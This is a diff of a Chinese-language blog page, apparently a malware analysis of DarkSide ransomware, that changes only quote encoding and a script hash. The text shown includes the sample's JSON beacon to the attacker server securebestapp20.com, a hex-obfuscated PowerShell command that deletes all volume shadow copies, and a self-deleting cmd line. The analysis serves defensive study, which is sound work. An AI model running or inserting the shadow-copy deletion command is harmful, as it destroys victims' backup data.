@@ -289,20 +289,20 @@ cmp dword ptr ds:[eax+0xC], 0x220
 <h4 id="发送信息至服务器函数">发送信息至服务器函数<a href="#发送信息至服务器函数" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
 <p>将本地的系统相关信息发送到攻击者的服务器：json格式内容如下：</p>
 <pre tabindex="0"><code>{
-	&quot;bot&quot;:{
-	&quot;ver&quot;:&quot;1.8.6.2&quot;,
-	&quot;uid&quot;:&quot;060108efb510c98&quot;
+	&#34;bot&#34;:{
+	&#34;ver&#34;:&#34;1.8.6.2&#34;,
+	&#34;uid&#34;:&#34;060108efb510c98&#34;
 	},
-	&quot;os&quot;:{
-	&quot;lang&quot;:&quot;zh-CN&quot;,
-	&quot;username&quot;:&quot;alee&quot;,
-	&quot;hostname&quot;:&quot;WIN-B1ESUN1R9U8&quot;,
-	&quot;domain&quot;:&quot;WORKGROUP&quot;,
-	&quot;os_type&quot;:&quot;windows&quot;,
-	&quot;os_version&quot;:&quot;Windows 7 Ultimate&quot;,
-	&quot;os_arch&quot;:&quot;x64&quot;,
-	&quot;disks&quot;:&quot;C:72/99&quot;,
-	&quot;id&quot;:&quot;826dfd7bd5985bdbd259&quot;
+	&#34;os&#34;:{
+	&#34;lang&#34;:&#34;zh-CN&#34;,
+	&#34;username&#34;:&#34;alee&#34;,
+	&#34;hostname&#34;:&#34;WIN-B1ESUN1R9U8&#34;,
+	&#34;domain&#34;:&#34;WORKGROUP&#34;,
+	&#34;os_type&#34;:&#34;windows&#34;,
+	&#34;os_version&#34;:&#34;Windows 7 Ultimate&#34;,
+	&#34;os_arch&#34;:&#34;x64&#34;,
+	&#34;disks&#34;:&#34;C:72/99&#34;,
+	&#34;id&#34;:&#34;826dfd7bd5985bdbd259&#34;
 	}
 }
 </code></pre><p>服务器为：<code>securebestapp20.com</code></p>
@@ -310,7 +310,7 @@ cmp dword ptr ds:[eax+0xC], 0x220
 <p>核心代码如下：</p>
 <p><img src="/darkside_images/5604835168666.png" alt=""></p>
 <p>powershell命令如下：</p>
-<pre tabindex="0"><code>40B5E2:L&quot;powershell -ep bypass -c \&quot;(0..61)|%{{$s+=[char][byte]('0x'+'4765742D576D694F626A6563742057696E33325F536861646F77636F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20'.Substring(2*$_,2))}};iex $s\&quot;&quot;
+<pre tabindex="0"><code>40B5E2:L&#34;powershell -ep bypass -c \&#34;(0..61)|%{{$s+=[char][byte](&#39;0x&#39;+&#39;4765742D576D694F626A6563742057696E33325F536861646F77636F7079207C20466F72456163682D4F626A656374207B245F2E44656C65746528293B7D20&#39;.Substring(2*$_,2))}};iex $s\&#34;&#34;
 </code></pre><p>将十六进制转换成字符串如下：</p>
 <pre tabindex="0"><code>Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
 </code></pre><h4 id="检索本地磁盘空闲空间">检索本地磁盘空闲空间<a href="#检索本地磁盘空闲空间" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
@@ -331,7 +331,7 @@ cmp dword ptr ds:[eax+0xC], 0x220
 <p>自我删除的主函数如下：</p>
 <p><img src="/darkside_images/33802100566.png" alt=""></p>
 <p>使用<code>Procmon</code>检测到的指令如下：</p>
-<pre tabindex="0"><code>&quot;C:\Windows\system32\cmd.exe&quot; /C DEL /F /Q C:\Users\alee\Desktop\DARKSI~1\Darkside.exe &gt;&gt; NUL
+<pre tabindex="0"><code>&#34;C:\Windows\system32\cmd.exe&#34; /C DEL /F /Q C:\Users\alee\Desktop\DARKSI~1\Darkside.exe &gt;&gt; NUL
 </code></pre><p>在命令行使用<code>cmd /?</code>可以了解到：</p>
 <pre tabindex="0"><code>/C      执行字符串指定的命令然后终止
 /Q      关闭回显
@@ -375,7 +375,7 @@ cmp dword ptr ds:[eax+0xC], 0x220
 
 
 
-	<script src="https://www.a1ee.cn/js/bundle.min.7d8545daa55d62427355498dd8da13f98ff79a7938ce7d2a5e2ae1ec0de3beb8.js" integrity="sha256-fYVF2qVdYkJzVUmN2NoT+Y/3mnk4zn0qXirh7A3jvrg=" crossorigin="anonymous"></script>
+	<script src="https://www.a1ee.cn/js/bundle.min.8256b8724b9578bbdf6d6f04c894255bc760e78e8a2d60ec0a91ea993acd3b77.js" integrity="sha256-gla4ckuVeLvfbW8EyJQlW8dg546KLWDsCpHqmTrNO3c=" crossorigin="anonymous"></script>
 	
 
 </body>
